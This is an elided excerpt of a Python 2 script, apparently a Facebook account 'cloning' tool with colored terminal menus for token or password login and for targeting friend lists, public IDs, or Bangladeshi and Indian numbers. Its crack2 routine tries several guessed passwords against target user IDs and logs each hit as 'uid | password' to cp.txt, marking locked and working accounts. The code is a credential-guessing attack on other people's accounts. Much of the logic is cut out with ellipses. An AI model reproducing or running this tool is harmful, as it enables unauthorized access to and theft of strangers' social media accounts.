...
def login_choice():
    ...
    print ("\033[1;96m[2]\033[1;96m-⋄-\033[1;92mRandom Number Cloning       \033[1;92m(\033[1;92mno login\033[1;96m) ")
...
def loginvia():
    ...
    os.system('clear')
    print logo
    print ("\033[1;91m[1]\033[1;96m-⋄-\033[1;92mlogin With Access Token ")
    print ("\033[1;91m[2]\033[1;96m-⋄-\033[1;92mLogin With User And Pass")
...
def clone_loginvia():
	...
	print("\033[1;91m--------------------------------------------------")
        token = raw_input("\033[1;91m[+]\033[1;92m Paste :\033[1;96m ")
	print("\033[1;91m--------------------------------------------------")
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        abm("\r\033[1;92m[✓] Login Successfull\033[0;96m")
...
def loginfb():
    ...
    print("\033[1;91m--------------------------------------------------")
    id = raw_input("\033[1;91m[+]\033[1;92m Email/ID/Number :\033[1;96m ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
...
def menu():
    ...
    print("\033[1;91m--------------------------------------------------")
    print("\033[1;92m[1]\033[1;91m-⋄-\033[1;97mClone Frienlist and Public ID")
    print("\033[1;92m[2]\033[1;91m-⋄-\033[1;97mClone Bangladesh and India")
...
def menu_select():
    ...
    if option =="2":
        ...
        os.system("rm -rf .login.txt")
        time.sleep(1)
        print("\033[1;92m[✓] Logged Out Successfully\033[0;96m")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()
...
def crack2():
	...
	if select=="1":
		...
		print("\033[1;91m--------------------------------------------------")
		idt = raw_input("\033[1;91m[+]\033[1;92m Input ID :\033[1;96m ")
		print("\033[1;91m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
		    	...
		    	if "access_token" in d:
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    ...
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;91m[\x1b[1;91mNIKI-CP\x1b[1;91m]\x1b[1;91m "+uid+"\x1b[1;91m | \x1b[1;91m"+pass3+"\x1b[1;91m | \x1b[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;91m[\x1b[1;91mNIKI-CP\x1b[1;91m]\x1b[1;91m "+uid+"\x1b[1;91m | \x1b[1;91m"+pass4+"\x1b[1;91m | \x1b[1;91m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;91m[\x1b[1;91mNIKI-CP\x1b[1;91m]\x1b[1;91m "+uid+"\x1b[1;91m | \x1b[1;91m"+pass5+"\x1b[1;91m | \x1b[1;91m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;91m[\x1b[1;91mNIKI-CP\x1b[1;91m]\x1b[1;91m "+uid+"\x1b[1;91m | \x1b[1;91m"+pass6+"\x1b[1;91m | \x1b[1;91m"+name)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;91m[\x1b[1;91mNIKI-CP\x1b[1;91m]\x1b[1;91m "+uid+"\x1b[1;91m | \x1b[1;91m"+pass7+"\x1b[1;91m | \x1b[1;91m"+name)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		    	...
		    	if "access_token" in d:
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    ...
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;91m[\x1b[1;91mNIKI-CP\x1b[1;91m]\x1b[1;91m "+uid+"\x1b[1;91m | \x1b[1;91m"+pass3+"\x1b[1;91m | \x1b[1;91m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;91m[\x1b[1;91mNIKI-OK\x1b[1;91m]\x1b[1;91m "+uid+"\x1b[1;91m | \x1b[1;91m"+pass7+"\x1b[1;91m | \x1b[1;91m"+name)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                ...
		                if 'access_token' in d:
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;91m[\x1b[1;91mNIKI-CP\x1b[1;92m]\x1b[1;91m "+uid+"\x1b[1;91m | \x1b[1;91m"+pass4+"\x1b[1;91m | \x1b[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
